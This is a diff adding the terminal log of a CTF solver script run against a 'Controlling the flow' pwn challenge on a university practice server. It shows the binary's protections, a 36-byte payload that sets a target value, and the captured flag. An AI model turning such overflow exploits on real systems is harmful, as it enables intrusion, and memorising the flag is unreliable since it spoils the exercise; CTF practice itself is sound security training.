@@ -1,0 +1,19 @@
+┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Digital Security Lab CTF/Pwn/Controlling the flow]
+└─$ python3 solver.py
+[*] '/home/wanzkey/Digital Security Lab CTF/Pwn/Controlling the flow/chall'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+[+] Opening connection to practice-digitalsecuritylab.di.unipi.it on port 10002: Done
+[*] Payload length: 36
+[*] Target Value: 0x41424344
+[*] Switching to interactive mode
+Wait, how did you do it?
+flag{contr0lling_v4lu3s_4ft3r_th3_buff3rs!}
+[*] Got EOF while reading in interactive
+$
+[*] Interrupted
+[*] Closed connection to practice-digitalsecuritylab.di.unipi.it port 10002
